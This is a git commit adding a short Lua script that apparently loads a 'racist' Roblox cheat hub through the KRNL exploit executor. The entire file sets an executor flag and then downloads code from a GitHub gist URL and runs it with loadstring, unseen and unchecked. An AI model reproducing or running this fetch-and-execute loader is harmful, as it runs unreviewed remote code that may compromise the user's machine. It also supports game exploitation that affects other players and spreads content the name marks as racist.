a6a9a817a60b911f2a12f7cdc1b8fd4b0177d54b
GreenMs02 <proswat03@gmail.com>
2021-05-07 10:09:17 +0700

    Create racistnullwarehub.lua

---
+++ racistnullwarehub.lua
@@ -0,0 +1,4 @@
+-- racist nullwarehub
+getgenv().KRNL_LOADED = true
+
+loadstring(game:HttpGet'https://gist.githubusercontent.com/M6HqVBcddw2qaN4s/37eef2120d509b37b31fa73944ab2361/raw/kT2fVEFnzDfCRXAP')()
